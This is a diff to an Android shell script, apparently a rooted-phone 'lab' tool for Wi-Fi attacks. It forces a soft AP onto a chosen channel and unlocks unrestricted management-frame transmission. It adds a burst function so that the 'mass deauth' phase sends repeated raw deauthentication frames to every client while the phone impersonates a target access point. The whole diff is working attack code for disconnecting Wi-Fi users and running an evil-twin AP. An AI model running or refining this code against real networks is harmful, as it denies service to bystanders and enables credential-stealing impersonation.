@@ -160,16 +160,29 @@ act_ap_up() {                            # $1 freq, $2 ssid, $3 pass
     cmd wifi stop-softap >/dev/null 2>&1
     svc wifi disable
     sleep 1
-    cmd wifi start-softap "$ssid" wpa2 "$pass" -b "$band" >/dev/null 2>&1
-    sleep 9
+    cmd wifi start-softap "$ssid" wpa2 "$pass" >/dev/null 2>&1
+    n=0
+    while :; do
+        got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
+        [ -n "$got" ] && break
+        n=$((n + 1))
+        [ "$n" -ge 10 ] && break
+        sleep 2
+    done
+    say "AP started on ${got:-?} MHz, forcing $freq ..."
     echo "$freq" > "$Q/monitor_sap_force_channel"
-    sleep 6
-    got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
-    say "requested: $freq MHz   SAP reports: $got MHz"
-    if [ "$got" != "$freq" ]; then
-        warn "CSA may still be settling - recheck with: lab status"
+    n=0
+    while :; do
+        got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
+        [ "$got" = "$freq" ] && break
+        n=$((n + 1))
+        [ "$n" -ge 8 ] && break
+        sleep 2
+    done
+    if [ "$got" = "$freq" ]; then
+        ok "SAP confirmed on $freq MHz"
     else
-        ok "SAP on channel"
+        warn "channel not confirmed (reports ${got:-?}) - verify with lab status"
     fi
     gate_on  monitor_probe_tx
     gate_on  monitor_mgmt_tx_unrestricted
@@ -208,6 +221,16 @@ act_ap_deauth() {                        # $1 victim, $2 ap-bssid, $3 count, $4 
     done
     sleep 2
     show_counters
+}
+
+# burst one client: sleeping radios miss single frames, so fire a spread
+act_burst() {                            # $1 freq, $2 hex, $3 frames, $4 interval
+    j=0
+    while [ "$j" -lt "${3:-5}" ]; do
+        send_frame "$1" "$2"
+        j=$((j + 1))
+        [ "$j" -lt "${3:-5}" ] && sleep "${4:-0.4}"
+    done
 }
 
 act_data() {                             # $1 freq, $2 hex
@@ -374,12 +397,11 @@ act_deauth_all() {
     hdr "phase 2: AP role on $freq (impersonating $1)"
     act_ap_up "$freq" LabAP labpass123
 
-    hdr "phase 3: mass deauth x$rounds rounds"
+    hdr "phase 3: mass deauth x$rounds rounds (burst per client)"
     i=0
     while [ "$i" -lt "$rounds" ]; do
         for c in $(cat "$clf"); do
-            send_frame "$freq" "c0000000${c}${apb}${apb}00000700"
-            sleep "$interval"
+            act_burst "$freq" "c0000000${c}${apb}${apb}00000700" 5 0.4
         done
         i=$((i + 1))
         say "round $i/$rounds done"
